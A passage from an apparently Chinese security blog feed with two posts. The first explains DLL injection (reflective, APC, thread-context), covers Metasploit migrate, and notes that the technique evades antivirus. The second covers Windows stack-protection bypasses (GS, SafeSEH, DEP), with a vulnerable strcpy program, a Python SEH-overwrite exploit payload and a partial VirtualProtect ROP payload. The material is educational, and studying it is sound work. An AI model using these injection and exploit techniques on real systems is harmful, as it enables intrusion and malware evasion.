class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hRemoteProcess, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="built_in">FreeModule</span>(Ntdll);</span><br><span class="line"></span><br><span class="line">wcout &lt;&lt; <span class="string">&quot;injection complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ab29867d886c12b9b42013810ad19cbc.png" alt="image-20230717205213381" /></p><h1 id="反射dll注入"><a class="markdownIt-Anchor" href="#反射dll注入"></a> 反射DLL注入</h1><p>这里找了一张先知的图，上面说了反射DLL注入的流程，原文在这里<a href="https://xz.aliyun.com/t/11072">https://xz.aliyun.com/t/11072</a></p><p><img src="https://img.joe1sn.top/uploads/big/8ac2e3d0d3139da37de7067a9a9d8e51.png" alt="image-20230717210533079" /></p><p>最大的区别就是我们没有使用<code>LoadLibarary</code>这个函数，而是相当于自己写了一个DLL加载器</p><p>仔细观察过程就看得出来，<strong>远程线程调用注入</strong>写入的是DLL路径，然后创建远程调用<code>LoadLibarary</code>（LPTHREAD_START_ROUTINE）</p><p><strong>反射DLL注入</strong>是将整个文件解析过后，获得必要的dll句柄和函数为修复导入表做准备，分配一块新内存去取解析dll，并把pe头复制到新内存中和将各节复制到新内存中，修复导入表和重定向表，执行DllMain()函数。</p><p>群里聊到了进程迁移技术，msf上的migrate原理就是反射DLL注入</p><ol><li><p>读取metsrv.dll（metpreter payload模板dll）文件到内存中。</p></li><li><p>生成最终的payload。</p><p>a) msf生成一小段汇编migrate stub主要用于建立socket连接。</p><p>b) 将metsrv.dll的dos头修改为一小段汇编meterpreter_loader主要用于调用reflective loader函数和dllmain函数。在metsrv.dll的config block区填充meterpreter建立session时的配置信息。</p><p>c) 最后将migrate stub和修改后的metsrv.dll拼接在一起生成最终的payload。</p></li><li><p>向msf server发送migrate请求和payload。</p></li><li><p>msf向迁移目标进程分配一块内存并写入payload。</p></li><li><p>msf首先会创建的远程线程执行migrate stub，如果失败了，就会尝试用apc注入的方式执行migrate stub。migrate stub会调用meterpreter loader，meterpreter loader才会调用reflective loader。</p></li><li><p>reflective loader进行反射式dll注入。</p></li><li><p>最后msf client和msf server建立一个新的session。</p></li></ol><p>这里就不自己写了，参考的是<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p><p>首先需要描述的就是DLL的解析过程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( !hProcess  || !lpBuffer || !dwLength )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if the library has a ReflectiveLoader...</span></span><br><span class="line">dwReflectiveLoaderOffset = <span class="built_in">GetReflectiveLoaderOffset</span>( lpBuffer );</span><br><span class="line"><span class="keyword">if</span>( !dwReflectiveLoaderOffset )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// alloc memory (RWX) in the host process for the image...</span></span><br><span class="line">lpRemoteLibraryBuffer = <span class="built_in">VirtualAllocEx</span>( hProcess, <span class="literal">NULL</span>, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); </span><br><span class="line"><span class="keyword">if</span>( !lpRemoteLibraryBuffer )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write the image into the host process...</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="built_in">WriteProcessMemory</span>( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, <span class="literal">NULL</span> ) )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add the offset to ReflectiveLoader() to the remote library address...</span></span><br><span class="line">lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a remote thread in the host process to call the ReflectiveLoader!</span></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>( hProcess, <span class="literal">NULL</span>, <span class="number">1024</span>*<span class="number">1024</span>, lpReflectiveLoader, lpParameter, (DWORD)<span class="literal">NULL</span>, &amp;dwThreadId );</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span>( <span class="number">0</span> );</span><br></pre></td></tr></table></figure><p><code>lpBuffer</code>就是读取到内存中的DLL的数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// uiNameArray = the address of the modules export directory entry</span></span><br><span class="line">uiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset of the export directory</span></span><br><span class="line">uiExportDir = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of name pointers</span></span><br><span class="line">uiNameArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">uiAddressArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of name ordinals</span></span><br><span class="line">uiNameOrdinals = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get a counter for the number of exported functions...</span></span><br><span class="line">dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line"><span class="comment">// loop through all the exported functions to find the ReflectiveLoader</span></span><br><span class="line"><span class="keyword">while</span>( dwCounter-- )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> * cpExportedFunctionName = (<span class="type">char</span> *)(uiBaseAddress + <span class="built_in">Rva2Offset</span>( <span class="built_in">DEREF_32</span>( uiNameArray ), uiBaseAddress ));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">strstr</span>( cpExportedFunctionName, <span class="string">&quot;ReflectiveLoader&quot;</span> ) != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">uiAddressArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// use the functions name ordinal as an index into the array of name pointers</span></span><br><span class="line">uiAddressArray += ( <span class="built_in">DEREF_16</span>( uiNameOrdinals ) * <span class="built_in">sizeof</span>(DWORD) );</span><br><span class="line"></span><br><span class="line"><span class="comment">// return the File Offset to the ReflectiveLoader() functions code...</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Rva2Offset</span>( <span class="built_in">DEREF_32</span>( uiAddressArray ), uiBaseAddress );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// get the next exported function name</span></span><br><span class="line">uiNameArray += <span class="built_in">sizeof</span>(DWORD);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the next exported function name ordinal</span></span><br><span class="line">uiNameOrdinals += <span class="built_in">sizeof</span>(WORD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p><code>GetReflectiveLoaderOffset</code>就是解析文件头找到DLL的导出表，如果发现<code>ReflectiveLoader</code>的函数，那么返回在<code>hProcess</code>的内存文件中的位置</p><p>然后回到<code>LoadRemoteLibraryR</code>使用<code>CreateRemoteThread</code>进行注入</p><p>关于RVA和VA的计算可以参考我很早写的一篇博客：<a href="https://www.jianshu.com/p/231206f9fbaf">PE文件结构中的RVA与RAW</a></p><p>现在可以看一下他的DLL是如何构造的</p><p>首先存在一个导出函数</p><p><img src="https://img.joe1sn.top/uploads/big/5f38a3c3481e227dd4bc7785f3ab41ca.png" alt="image-20230718084605818" /></p><p>通过阅读这个函数的代码发现</p><ol><li>使用<code>_ReturnAddress</code>获得调用完成的返回地址，反推初DLL的基地址</li><li>通过PEB得到<code>LoadLibraryA</code>、<code>GetProcAddress</code>、<code>VirtualAlloc</code>，使用<code>NtFlushInstructionCache</code>暂时存储其他导入表的函数</li><li>迁移之前的DLL镜像到新的位置</li><li>覆写迁移后的文件头的节区位置</li><li>使用刚才导入的<code>LoadLibraryA</code>、<code>GetProcAddress</code>修复IAT</li><li>处理重定向相关</li><li>找到DLLMain并跳转后执行</li></ol><h1 id="apc注入"><a class="markdownIt-Anchor" href="#apc注入"></a> APC注入</h1><p>在最开始的远程线程调用注入使用的是<code>TH32CS_SNAPPROCESS</code>，这里就是利用<code>KiUserDispatch</code>调度进行APC例程调用，让线程使用<code>LoadLibarary</code>进行注入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">THREADENTRY32 te = &#123; <span class="built_in">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line">HANDLE hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hThreadSnap) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Error In APC Injection\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL bStat = FALSE;</span><br><span class="line"><span class="comment">//得到第一个线程</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (te.th32OwnerProcessID == <span class="keyword">this</span>-&gt;dwPid) &#123;</span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">DWORD dwRet = <span class="built_in">QueueUserAPC</span>((PAPCFUNC)LoadLibraryW, hThread, (ULONG_PTR)pAddress);</span><br><span class="line"><span class="keyword">if</span> (dwRet &gt; <span class="number">0</span>)bStat = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/54c47164be9d9b6e6bf4a8a34377b787.png" alt="image-20230718092010464" /></p><p>还有一个技巧就是使用NTDLL中的未导出函数<code>NtTestAlert</code>就可以立即调用APC例程</p><p><strong>上面的把<code>hProcess = GetCurrentProcess()</code>，<code>pAddress = shellcode_Address</code>相当于使用DLL注入进行免杀了</strong></p><h1 id="上下文注入"><a class="markdownIt-Anchor" href="#上下文注入"></a> 上下文注入</h1><p>之前在写PE加载器的时候就想到了这个，主要是通过暂停程序，获得并修改上下文，在内存中写入shellcode，然后再恢复就行了</p><p>问题在于shellcode还有计算各种偏移，个人觉得涉及shellcode和汇编较多，就不再本篇文章赘述</p><p>用到的主要WINAPI就是</p><ol><li>创建会shellcode裸函数（<code>__declspec(naked)</code>）,导出<code>LoadLibrary</code>等函数</li><li><code>OpenProcess</code>后再<code>OpenThread</code>，使用<code>SuspendThread</code>暂停线程</li><li>创建类型为<code>CONTEXT</code>的变量，初始化<code>context.ContextFlags=CONTEXT_FULL</code></li><li><code>GetThreadContext</code>获得上下文</li><li><code>VirualAlloc</code>获得空间，类似<code>RtlMoveMemory</code>这种复制shellcode到空间</li><li>将<code>context.eip = shellcode_addr</code>，使用<code>SetThreadContext</code>重新设置上下文，<code>ResumeThread</code>恢复线程</li></ol><p>内核中的过程差不多，不过更多的是不一样的API</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;DLL 注入进化史&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】基础栈溢出保护绕过</title>
    <link href="https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/"/>
    <id>https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/</id>
    <published>2023-07-12T14:29:58.000Z</published>
    <updated>2023-07-13T12:25:05.423Z</updated>
    
    <content type="html"><![CDATA[<p>针对栈攻击的防护与绕过</p><span id="more"></span><h1 id="gs"><a class="markdownIt-Anchor" href="#gs"></a> GS</h1><p>GS本质上和Linux GCC中的canary很相似，他在栈帧的结尾（EBP之前）插入一给<code>DWORD</code>类型的值，其副本存在于<code>.data</code>中。</p><p><img src="https://img.joe1sn.top/uploads/big/b3c288e6425290fda519c82da1cad2d8.png" alt="image-20230712223606947" /></p><p>在编译的时候并不会存在GS保护有下面几种情况</p><ul><li>函数不包含缓冲区</li><li>函数被定义为具有变量参数列表</li><li>函数使用无保护的关键字标记</li><li>函数在第一个语句中包含内嵌汇编代码</li><li>缓冲区不是 8 字节类型且大小不大于 4 个字节</li></ul><p>不过仍然可以采用<code>#pragma strict_gs_check </code>强制启用GS保护</p><p><img src="https://img.joe1sn.top/uploads/big/750aa691ce894524469f1b01cd77e309.png" alt="image-20230712230456568" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vulfuction</span><span class="params">(<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arry[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(arry, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;yeah,i have GS protection&quot;</span>;</span><br><span class="line">vulfuction(str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/51469c6f21d21998618b65975dac846d.png" alt="image-20230712231538824" /></p><p><img src="https://img.joe1sn.top/uploads/big/374afa04add92f9d9522083ab2cb45ac.png" alt="image-20230712231847170" /></p><p>绕过方式要漏洞类型灵活选择</p><ul><li><p>如果是可以泄露那么泄露后拼接再溢出</p></li><li><p>再C++中，<code>struct</code>和<code>class</code>除了访问权限没有不同，那么有机会可以通过修改函数指针（比如虚函数）来进行RCE</p></li><li><p>如果存在任意地址写或者能过写道<code>.data</code>段（比如存在字符串格式化漏洞），可以将对比的cookie设置为特定值</p><p><img src="https://img.joe1sn.top/uploads/big/2b71e1f69270fdfb33074a2c981321bc.png" alt="image-20230713081622450" /></p><p><img src="https://img.joe1sn.top/uploads/big/acce2fb38f039e66a5257f69f0ee9336.png" alt="image-20230713082958542" /></p></li><li><p>GS机制没有存在SEH的保护，所以 <strong>【Win Pwn】基础栈溢出利用</strong> 中的利用手段仍然能够成功，只是溢出长度和ROP的Gadget需要重新设置。</p><p><img src="https://img.joe1sn.top/uploads/big/1e013c016c634b7c9b510528f57f7f11.png" alt="image-20230713000747391" /></p><p><img src="https://img.joe1sn.top/uploads/big/db77970446f88fc23cfb89501cc7f235.png" alt="image-20230713000801579" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x160</span>-<span class="built_in">len</span>(shellcode)-<span class="number">16</span>) <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\x9e\x26\x41\x00&quot;</span>    <span class="comment">#0041269E</span></span><br><span class="line"></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x2c\x07\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">                                                        <span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x64c;//sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">16</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2a8a0b38238c8d4b55c053daf8d7f822.png" alt="image-20230713081020816" /></p></li></ul><h1 id="safeseh"><a class="markdownIt-Anchor" href="#safeseh"></a> SafeSEH</h1><p>0day那本书上信息有点…过时了，这里可以参考微软的官方定义<a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/safeseh-image-has-safe-exception-handlers?view=msvc-170"><code>/SAFESEH</code>（映像具有安全异常处理程序）</a>，主要识别方法就是在<code>.rdata</code>中存在<code>IMAGE_LOAD_CONFIG_DIRECTORY32_2</code></p><p><img src="https://img.joe1sn.top/uploads/big/79a4334e1d29d557df4e66527b98c69a.png" alt="image-20230713090918752" /></p><p>通过<code>RtlDispatchException</code>函数实现</p><p><img src="https://img.joe1sn.top/uploads/big/dae06c1a5f9088ea1eed84fbfbbfca68.png" alt="image-20230713091103788" /></p><p>比较通杀的方法就是</p><ul><li>不使用SEH</li><li>在堆区上布置shellcode然后执行</li></ul><p>这里改动一下源代码</p><ol><li><p>把SEH的地址手动改为堆地址</p><p><img src="https://img.joe1sn.top/uploads/big/e8047ce0aa682162a04e464d06cb447e.png" alt="image-20230713093246026" /></p></li><li><p>经过校验后直接到堆中执行了</p><p><img src="https://img.joe1sn.top/uploads/big/23640b0c2f51bb770ee04be0cd63bf20.png" alt="image-20230713093529382" /></p><p><img src="https://img.joe1sn.top/uploads/big/5b3318808a12b59116c30bef0ff5c1ac.png" alt="image-20230713093751706" /></p><p>P3是重启了一次后截图，地址可能会不一样</p></li></ol><p>总结一下就是地址的ROP必须符合验证的权限，但是<strong>没有开启SafeSEH的DLL文件中的Gadget</strong>、没有<strong>DEP时候的堆地址</strong>都可以使用。</p><h1 id="dep"><a class="markdownIt-Anchor" href="#dep"></a> DEP</h1><p>DEP是类似于Windows上的NX，作用是禁止堆栈的数据拥有执行的权限，避免了Shellcode直接执行。</p><p>操作系统通过设置内存页的 NX/XD 属性标记，来指明不能从该内存执行代码。为了实现 这个功能，需要在内存的页面表（Page T able）中加入一个特殊的标识位（NX/XD）来标识是 否允许在该页上执行指令。当该标识位设置为 0 里表示这个页面允许执行指令，设置为 1 时表 示该页面不允许执行指令。</p><p>关于NX保护也可以手动查看</p><p><img src="https://img.joe1sn.top/uploads/big/e91415d0cafe28798ab17cbdfff475bb.png" alt="image-20230713095059334" /></p><p>只编译DEP可能还需要关闭运行时检查</p><p><img src="https://img.joe1sn.top/uploads/big/2ace5c957abc3787e65922ccf1a7e343.png" alt="image-20230713133201425" /></p><p>主要思路就是Ret2Libc</p><ul><li><p>调用<code>ZwSetInformationProcess</code>关闭DEP</p><p>在之前的《【win内核原理与实现】II. 进程与线程》中提到过<code>_KPROCESS</code>存在<code>ExecuteOptions</code></p><p><img src="https://img.joe1sn.top/uploads/big/b4d51d5aa29ea68f1f9a32053f3e6b20.png" alt="image-20230713100758503" /></p><p>我并没有在微软的官网上找到该结构体的说明，但是可以通过之前他们的逆向结果找到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Pos0 ExecuteDisable        :<span class="number">1b</span>it </span><br><span class="line">Pos1 ExecuteEnable         :<span class="number">1b</span>it </span><br><span class="line">Pos2 DisableThunkEmulation :<span class="number">1b</span>it </span><br><span class="line">Pos3 Permanent             :<span class="number">1b</span>it </span><br><span class="line">Pos4 ExecuteDispatchEnable :<span class="number">1b</span>it </span><br><span class="line">Pos5 ImageDispatchEnable   :<span class="number">1b</span>it </span><br><span class="line">Pos6 Spare                 :<span class="number">2b</span>it</span><br></pre></td></tr></table></figure><p>当前进程 DEP 开启时 ExecuteDisable 位被置 1，当 进程 DEP 关闭时 ExecuteEnable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的， Permanent 被置 1 后表示这些标志都不能再被修改。真正影响 DEP 状态是前两位，所以我们只 要将_KEXECUTE_OPTIONS 的值设置为 0x02（二进制为 00000010）就可以将 ExecuteEnable 置为 1。</p><p>使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; </span><br><span class="line">ZwSetInformationProcess( </span><br><span class="line"> NtCurrentProcess(),    <span class="comment">// (HANDLE)-1 </span></span><br><span class="line"> ProcessExecuteFlags,   <span class="comment">// 0x22 </span></span><br><span class="line"> &amp;ExecuteFlags,         <span class="comment">// ptr to 0x2 </span></span><br><span class="line"> <span class="keyword">sizeof</span>(ExecuteFlags)); <span class="comment">// 0x4 </span></span><br></pre></td></tr></table></figure><p>就可以关掉DEP保护了，在0day书中介绍了3种直接利用兼容性异常而导致DEP关闭的方法</p><blockquote><p>（1）当 DLL 受 SafeDisc 版权保护系统保护时；</p><p>（2）当 DLL 包含有.aspcak、.pcle、.sforce 等字节时；</p><p>（3）Windows V ista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE  \Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”键下边标识 出不需要启动 DEP 的模块时</p></blockquote><p>很可惜在windows10中这些情况几乎不会出现，所以方法不适用</p></li></ul><p>这两种是我比较喜欢用的，因为可以和免杀结合在一起</p><p>他们的基础就是类似LinuxPwn中的ROP构造，这里我使用的是32下，cdcle调用方式，使用栈传参</p><ul><li><p><code>VirtualProtect</code>改写内存权限</p><p>关于函数的用法：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">virtualProtect 函数 (memoryapi.h)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  LPVOID lpAddress,</span></span><br><span class="line"><span class="params">  [in]  SIZE_T dwSize,</span></span><br><span class="line"><span class="params">  [in]  DWORD  flNewProtect,</span></span><br><span class="line"><span class="params">  [out] PDWORD lpflOldProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>lpAddress</code>:  要改变属性的内存起始地址。</p><p><code>dwSize</code>:  要改变属性的内存区域大小。</p><p><code>flNewProtect</code>:  内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（0x40）时该 内存页为可读可写可执行。</p><p><code>pflOldProtect</code>:  内存原始属性类型保存地址。 修改内存属性成功时函数返回非 0，修改失败时返回 0。</p><p>不过API位于的是<code>shell32.dll</code>当中，所以要添加上<code>HINSTANCE hInst = LoadLibrary(L&quot;shell32.dll&quot;);</code></p><p>由于ROP依赖于函数调用的传参方式，下面是一个经典的传参</p><p><img src="https://img.joe1sn.top/uploads/big/ed81eaf5da5e42ca1bfb625c694f5216.png" alt="image-20230713193232979" /></p><p>ROP时栈的结构</p><p><img src="https://img.joe1sn.top/uploads/big/54294658ba1a5556fff36100908b0736.png" alt="image-20230713193507826" /></p><p>由于没有泄露点，所以只能在调试的时候修改。也可以使用Gadget来构造，比如说通过<code>ESP</code>相关得到栈地址之类的。（但是得到<code>VirtualProtect</code>就太困难了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*<span class="number">0x14</span></span><br><span class="line">payload = offset </span><br><span class="line">payload += <span class="string">b&quot;\x90&quot;</span>*<span class="number">4</span>    <span class="comment">#VirtualProtect</span></span><br><span class="line">payload += <span class="string">b&quot;\x80&quot;</span>*<span class="number">4</span>    <span class="comment">#Shellcode Address</span></span><br><span class="line">payload += <span 